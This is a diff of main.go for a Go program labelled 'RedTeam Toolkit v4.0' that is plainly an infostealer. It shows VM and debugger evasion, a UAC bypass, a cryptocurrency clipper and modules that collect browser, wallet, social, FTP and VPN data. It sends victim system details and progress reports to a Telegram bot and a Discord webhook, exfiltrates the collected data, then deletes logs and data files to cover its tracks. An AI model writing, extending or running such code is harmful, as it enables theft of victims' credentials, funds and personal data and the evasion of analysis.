@@ -1,10 +1,11 @@
 // ============================================================
-// main.go - Enhanced Entry Point with Full Features
+// main.go - RedTeam Toolkit v4.0 (Go) - FULL VERSION
 // ============================================================
 package main
 
 import (
 	"encoding/json"
+	"fmt"
 	"io/ioutil"
 	"log"
 	"os"
@@ -31,7 +32,6 @@ import (
 	"github.com/RU7HL355/redtm/pkg/utils/common"
 	"github.com/RU7HL355/redtm/pkg/utils/processkill"
 	"github.com/RU7HL355/redtm/pkg/utils/startup"
-	"github.com/RU7HL355/redtm/pkg/utils/telemetry"
 )
 
 // Config struct for configuration
@@ -46,24 +46,60 @@ type Config struct {
 }
 
 var config Config
+var startTime time.Time
 
 func main() {
+	startTime = time.Now()
+	
 	// Initialize logging
 	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
 	log.Println("🚀 RedTeam Toolkit v4.0 (Go) starting...")
-
+	log.Println("========================================")
+	
 	// Load configuration
 	if !loadConfig() {
 		log.Println("⚠️ No config found, using defaults")
 		config = getDefaultConfig()
+	} else {
+		log.Println("✅ Config loaded successfully")
 	}
 
-	// Initialize telemetry
-	telemetry.Init(config.BotToken, config.ChatID)
-	telemetry.SendHeartbeat("🚀 RedTeam Toolkit v4.0 (Go) started")
-	telemetry.SendHeartbeat("Host: " + common.GetHostname())
-	telemetry.SendHeartbeat("User: " + common.GetUsername())
-	telemetry.SendHeartbeat("OS: " + common.GetOS())
+	// Initialize exfil module FIRST
+	log.Println("📤 Initializing exfil module...")
+	exfil.Init(config.BotToken, config.ChatID, config.Discord)
+
+	// Send startup messages
+	log.Println("📤 Sending startup notifications...")
+	
+	// Test Telegram
+	log.Println("📤 Sending Telegram test message...")
+	if exfil.SendTelegram("✅ RedTeam Toolkit v4.0 (Go) is running!") {
+		log.Println("✅ Telegram test message sent successfully!")
+	} else {
+		log.Println("❌ Telegram test message failed! Check your bot token and chat ID.")
+		if len(config.BotToken) > 10 {
+			log.Printf("   Token: %s...", config.BotToken[:10])
+		} else {
+			log.Printf("   Token: %s", config.BotToken)
+		}
+		log.Printf("   Chat ID: %s", config.ChatID)
+	}
+
+	// Test Discord
+	log.Println("📤 Sending Discord test message...")
+	if exfil.SendDiscord("✅ RedTeam Toolkit v4.0 (Go) is running!") {
+		log.Println("✅ Discord test message sent successfully!")
+	} else {
+		log.Println("❌ Discord test message failed!")
+		if len(config.Discord) > 30 {
+			log.Printf("   Webhook: %s...", config.Discord[:30])
+		} else {
+			log.Printf("   Webhook: %s", config.Discord)
+		}
+	}
+
+	// Send system info
+	sendSystemInfo()
 
 	// Check if already running
 	if common.IsAlreadyRunning() {
@@ -76,15 +112,17 @@ func main() {
 
 	if antivm.IsVM() {
 		log.Println("⚠️ VM detected - exiting")
-		telemetry.SendHeartbeat("⚠️ VM detected - exiting")
+		exfil.SendHeartbeat("⚠️ VM detected - exiting")
 		return
 	}
 
 	if antidebug.IsDebugged() {
 		log.Println("⚠️ Debugger detected - exiting")
-		telemetry.SendHeartbeat("⚠️ Debugger detected - exiting")
+		exfil.SendHeartbeat("⚠️ Debugger detected - exiting")
 		return
 	}
+	
+	log.Println("✅ Anti-analysis checks passed")
 
 	// Privilege escalation
 	log.Println("🔐 Attempting UAC bypass...")
@@ -132,6 +170,7 @@ func main() {
 	}
 
 	// Run all actions in parallel
+	log.Println("📂 Starting extraction modules...")
 	for _, action := range actions {
 		log.Printf("📂 Starting: %s", action.name)
 		go action.fn()
@@ -141,23 +180,35 @@ func main() {
 	log.Println("💰 Starting crypto clipper...")
 	go clipper.Run(config.Cryptos)
 
-	// Wait for modules to complete
-	log.Println("⏳ Waiting for modules to complete...")
-	time.Sleep(30 * time.Second)
+	// Wait for modules to complete with progress updates
+	log.Println("⏳ Waiting for modules to complete (60 seconds)...")
+	exfil.SendHeartbeat("⏳ Starting data extraction...")
+
+	// Progress updates every 10 seconds
+	for i := 0; i < 6; i++ {
+		time.Sleep(10 * time.Second)
+		elapsed := int(time.Since(startTime).Seconds())
+		exfil.SendHeartbeat(fmt.Sprintf("⏳ Extraction in progress... %d seconds elapsed", elapsed))
+	}
 
 	// Collect and exfil all data
 	log.Println("📤 Exfiltrating data...")
+	exfil.SendHeartbeat("📤 Collecting and exfiltrating data...")
 	exfil.CollectAndSend()
 
 	// Cleanup
 	if config.SelfDestruct {
 		log.Println("💀 Self-destruct initiated...")
-		telemetry.SendHeartbeat("💀 Self-destruct initiated")
+		exfil.SendHeartbeat("💀 Self-destruct initiated")
 		time.Sleep(2 * time.Second)
 		selfDestruct()
 	}
 
-	telemetry.SendHeartbeat("✅ All tasks complete")
+	// Final heartbeat
+	exfil.SendHeartbeat("✅ All tasks complete")
+	
+	// Print summary
+	printSummary()
 
 	log.Println("✅ All tasks complete!")
 
@@ -169,10 +220,12 @@ func main() {
 func loadConfig() bool {
 	data, err := ioutil.ReadFile("config.json")
 	if err != nil {
+		log.Printf("❌ Failed to read config.json: %v", err)
 		return false
 	}
 
 	if err := json.Unmarshal(data, &config); err != nil {
+		log.Printf("❌ Failed to parse config.json: %v", err)
 		return false
 	}
 
@@ -204,6 +257,62 @@ func getDefaultConfig() Config {
 	}
 }
 
+// sendSystemInfo sends system information
+func sendSystemInfo() {
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USERNAME")
+	if username == "" {
+		username = os.Getenv("USER")
+	}
+	
+	info := fmt.Sprintf("🖥️ System Information\n")
+	info += fmt.Sprintf("   Hostname: %s\n", hostname)
+	info += fmt.Sprintf("   Username: %s\n", username)
+	info += fmt.Sprintf("   OS: %s\n", common.GetOS())
+	info += fmt.Sprintf("   Admin: %v\n", common.IsAdmin())
+	info += fmt.Sprintf("   Time: %s", time.Now().Format("2006-01-02 15:04:05"))
+	
+	exfil.SendHeartbeat(info)
+}
+
+// printSummary prints a summary of the run
+func printSummary() {
+	elapsed := int(time.Since(startTime).Seconds())
+	
+	log.Println("========================================")
+	log.Println("📊 SUMMARY")
+	log.Println("========================================")
+	log.Printf("   Duration: %d seconds", elapsed)
+	log.Printf("   Config: %s", getConfigStatus())
+	log.Printf("   Telegram: %s", getTelegramStatus())
+	log.Printf("   Discord: %s", getDiscordStatus())
+	log.Println("========================================")
+}
+
+// getConfigStatus returns the config status
+func getConfigStatus() string {
+	if config.BotToken != "" && config.ChatID != "" {
+		return "✅ Configured"
+	}
+	return "❌ Not Configured"
+}
+
+// getTelegramStatus returns the Telegram status
+func getTelegramStatus() string {
+	if config.BotToken != "" {
+		return "✅ Enabled"
+	}
+	return "❌ Disabled"
+}
+
+// getDiscordStatus returns the Discord status
+func getDiscordStatus() string {
+	if config.Discord != "" {
+		return "✅ Enabled"
+	}
+	return "❌ Disabled"
+}
+
 // selfDestruct removes all traces
 func selfDestruct() {
 	log.Println("🧹 Cleaning up...")
@@ -211,6 +320,22 @@ func selfDestruct() {
 	// Delete log files
 	os.Remove("redteam.log")
 	os.Remove("telemetry.log")
+
+	// Delete JSON data files
+	files := []string{
+		"browser_data.json",
+		"system_info.json",
+		"wallets.json",
+		"games.json",
+		"socials.json",
+		"common_files.json",
+		"ftps.json",
+		"vpns.json",
+	}
+	
+	for _, file := range files {
+		os.Remove(file)
+	}
 
 	// Delete executable (Windows)
 	if common.IsWindows() {
